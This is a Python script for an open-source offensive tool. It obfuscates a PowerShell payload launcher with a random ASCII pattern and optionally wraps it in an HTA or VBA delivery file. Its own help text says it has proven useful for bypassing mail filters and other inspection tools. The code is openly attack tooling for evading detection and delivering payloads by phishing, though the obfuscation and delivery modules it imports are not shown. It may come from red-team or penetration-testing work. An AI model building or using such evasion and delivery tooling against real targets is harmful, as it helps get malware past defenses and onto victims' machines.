#!/usr/bin/env python
# Copyright (c) 2017, Jeff McCutchan [jamcut]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import sys

import lib.delivery as delivery
import lib.obfuscator as obfuscator
import lib.printer as printer

def get_arguments():
	"""This function recieves the arguments from the user"""
	parser = argparse.ArgumentParser(description='This script rangomly generated an ascii pattern for use in obfuscating PowerShell launchers.  It has proven useful for bypassing mail filters, and other inspection tools.')
	parser.add_argument('-l', '--launcher', help='file that contains payload launcher', required=True)
	parser.add_argument('-d', '--delivery', help='delivery mechanism (hta or vba)', choices=['hta', 'vba'], default=None)
	return parser.parse_args()

def prepare_delivery(dv, type, obfuscated_launcher, pattern):
	"""This function builds the specified type of delivery mechanish"""
	if type == 'hta':
		hta_file = dv.generate_hta(obfuscated_launcher, pattern)
		return 'Base HTA file:\n{0}\n'.format(hta_file)
	else:
		vba_file = dv.generate_vba(obfuscated_launcher, pattern)
		return 'Base VBA file:\n{0}\n'.format(vba_file)

def main():
	"""This is the main function which calls other functions and implements
	the necessary logic for the script to execute successfully"""
	args = get_arguments()

	pr = printer.Printer()
	ob = obfuscator.Obfuscator()
	dv = delivery.Delivery()

	try:
		launcher = open(args.launcher, 'r').read().rstrip()
	except IOError:
		pr.print_error('Failed to open specified launcher file: {0}'.format(args.launcher))
		sys.exit(1)

	# Create random pattern and obfuscate launcher
	pattern = None
	while not pattern:
		pattern = ob.generate_pattern()
		if pattern in launcher:
			pattern = None
	pr.print_status('Using pattern: {0}'.format(pattern))
	obfuscated_launcher = ob.pattern_obfuscate(launcher, pattern)

	# Verify that pattern is compatible with launcher
	pr.print_status('Verifying string replacement will be successful...')
	if launcher == obfuscated_launcher.replace(pattern, ''):
		pr.print_good('Success!')
	else:
		pr.print_error('String replacement failed, obfuscated launcher is not valid.  Please try again.')
		sys.exit(1)

	# Check delivery options and build/display requested file type
	if not args.delivery:
		pr.print_status('Obfuscated launcher: {0}\n'.format(obfuscated_launcher))
	else:
		delivery_msg = prepare_delivery(dv, args.delivery, obfuscated_launcher, pattern)
		pr.print_status(delivery_msg)

if __name__ == '__main__':
	main()